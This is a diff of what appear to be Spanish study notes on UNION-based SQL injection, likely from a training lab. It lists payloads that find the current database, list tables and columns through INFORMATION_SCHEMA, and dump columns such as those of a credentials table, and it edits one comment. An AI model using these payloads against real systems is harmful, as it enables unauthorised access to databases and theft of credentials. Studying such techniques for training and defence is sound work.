@@ -99,7 +99,8 @@ cn' UNION select 1,database(),2,3-- -
 #Nos permite conocer la base de datos a la cual se le realizan las consultas
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<database>'-- -
 #Nos permite listar los nombres de la tablas y la db a la que pertenece. En este caso se busca para que la db solicitada sea dev
-#El segundo parametro puede ser un tanto redundante
+#where table_schema='<database>' puede obviarse (recomendado)
+
 cn' UNION select 1,COLUMN_NAME,2,3 from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'-- - 
 #Busco los nombres de las columbas de la tabla credenciales que me aparecio antes
 cn' UNION select 1, <columna1>, <columna2>, 4 from <database>.<table>-- -
